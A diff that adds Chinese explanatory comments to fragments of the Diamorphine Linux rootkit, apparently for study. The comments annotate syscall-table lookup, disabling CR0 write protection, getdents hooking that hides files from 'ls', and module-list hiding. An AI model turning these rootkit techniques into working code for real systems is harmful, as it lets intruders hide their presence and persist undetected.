@@ -28,7 +28,7 @@
 #include "diamorphine.h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-unsigned long cr0;
+unsigned long cr0;//CR0寄存器
 #elif IS_ENABLED(CONFIG_ARM64)
 void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
 unsigned long start_rodata;
@@ -37,7 +37,7 @@ unsigned long init_begin;
 #else
 #error Unsupported architecture
 #endif
-static unsigned long *__sys_call_table;
+static unsigned long *__sys_call_table;//系统调用表
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 	static t_syscall orig_getdents;
@@ -60,7 +60,7 @@ get_syscall_table_bf(void)
 	unsigned long *syscall_table;
 	
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");//获得sys_call_table的地址
 	return syscall_table;
 #else
 	unsigned long int i;
@@ -222,7 +222,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				memmove(dir, (void *)dir + dir->d_reclen, ret);//shell ls指令下隐藏当前文件名
 				continue;
 			}
 			prev->d_reclen += dir->d_reclen;
@@ -281,7 +281,7 @@ tidy(void)
 //	kfree(THIS_MODULE->mkobj.drivers_dir);
 //	THIS_MODULE->mkobj.drivers_dir = NULL;
 }
-
+//module列表添加
 static struct list_head *module_previous;
 static short module_hidden = 0;
 void
@@ -347,7 +347,7 @@ hacked_kill(pid_t pid, int sig)
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static inline void
-write_cr0_forced(unsigned long val)
+write_cr0_forced(unsigned long val)//关闭写保护
 {
     unsigned long __force_order;
 
